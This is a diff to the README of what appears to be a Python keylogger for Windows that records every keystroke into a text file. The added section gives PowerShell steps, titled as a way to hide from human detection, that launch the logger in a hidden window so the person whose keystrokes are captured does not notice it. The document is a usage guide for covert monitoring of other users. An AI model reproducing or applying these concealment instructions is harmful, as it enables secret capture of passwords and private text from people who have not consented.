@@ -14,6 +14,15 @@ Can be used across users on Windows. Meant to be used via the terminal.
   - IMPORTANT: changing the directory ensures the keystrokes are written into the text file where the script is
 - Run the script from the command prompt/terminal
   - for example: "python C:\filePath\main.py"
+ 
+## How to run script in background to hide from human detection
+- Open a new Notepad file
+- Write the following commands:
+  - cd "c:\filePath"
+  - $process = Start-Process -FilePath "python" -ArgumentList ".\main.py" -WindowStyle Hidden -PassThru
+- Save Notepad file as a .ps1 file
+- To run, right click file and select "Run with PowerShell"
+- Now the script should be running in the background :)
 
 ## Key features
 - Program will keep recording keystrokes and writing them into a text file until you press the "escape" key (subject to change)
